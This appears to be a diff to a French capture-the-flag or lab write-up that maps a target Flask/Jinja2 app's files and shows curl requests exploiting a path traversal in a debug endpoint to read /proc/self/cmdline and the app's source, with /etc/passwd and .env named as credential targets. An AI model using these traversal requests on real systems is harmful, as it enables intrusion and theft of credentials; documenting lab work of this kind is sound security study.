@@ -198,8 +198,61 @@ Dans la piste 2, il est mentionne `Jinja2`, je connaissais pas, c'est un moteur 
 ├── uploads/
 └── logs/
 ```  
+Apres avoir dig un peu, je schematiserai plutot comme ca pour optimiser mes recherches via **LFI**:
+```
+|var/www/hal9042 ||   ||=> /home       ||   ||=> /etc        ||
+|---- appli root ||   ||---- user repo ||   ||--- config sys ||
+||---------------||   ||---------------||   ||---------------||
+||    app.py     ||   ||   paco        ||   || /etc/passwd   ||
+|| flask+jinja2  ||   || debug.js auth?||   ||   users found ||
+||---------------||   ||---------------||   ||---------------||
+|                 |   |                 |   |                 |
+||---------------||   ||---------------||   ||---------------||
+|| config/.env   ||   || wil           ||   ||  service file ||
+||               ||   ||bash shell user||   || launch config ||
+||---------------||   ||---------------||   ||---------------||
+|                 |   |                 |   |                 |
+||---------------||   ||---------------||   ||---------------||
+||  debug.js     ||   || sophie        ||   ||               ||
+||               ||   ||bash shell user||   ||               ||
+||---------------||   ||---------------||   ||---------------||
+|                 |   |                 |   |                 |
+||---------------||   ||---------------||   ||---------------||
+||   reviewer/   ||   ||   hal         ||   ||               ||
+||               ||   ||               ||   ||               ||
+||---------------||   ||---------------||   ||---------------||
+|                 |   |                 |   |                 |
+```
+Ce sera plus simple pour chercher des fichiers de config, credentials etc.. via le path traversal.  
 
-Ce sera plus simple pour chercher des fichiers de config, credentials etc.. via le path traversal. 
+Ce resultat a ete obtenu et modifie au fur et a mesure des hypotheses, si je devais resumer et schematiser la decouverte la plus sympa jusqu'ici :  
+- Sous Linux, chaque processus possede un dossier dans le repertoire `/proc`. Donc, si on cherche `proc/self/cmdline`, on demande clairement : "Les aruguments avec lesquels le proc a ete lance stp", c'est le endpoint de debug qui nous permet de lire le fichier grace au *Path Traversal*  
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.0.2.2:5042/api/debug?file=../../../../proc/self/cmdline --output cmdline_log.txt
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   100 100   100   0     0 59559     0  --:--:-- --:--:-- --:--:-- 100000
+                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ cat cmdline_log.txt                                                                            
+/var/www/hal9042/venv/bin/python3
+/var/www/hal9042/venv/bin/gunicorn
+-w2
+-b
+127.0.0.1:8000
+app:app 
+
+(j'ai fait du pretty pour la lisibilite)
+```
+- On sait maintenant que l'environnement Python virtuel se trouve ici : `/var/www/hal9042` et que l'on cherche un module Flask appele `app`.  
+[Source : Red Hat](https://docs.redhat.com/fr/documentation/red_hat_enterprise_linux/4/html/reference_guide/s2-proc-cmdline).  
+
+- Avec cette requete : `curl http://10.0.2.2:5042/api/debug?file=../../../../var/www/hal9042/app.py `
+=> on peut donc obtenir le code source de l'application. [Cliquez-ici](./utils/python/app.py)
+
+
 
 2. *Piste 2* `<!-- debug.js still in /static/js/ pls remove -->`
 
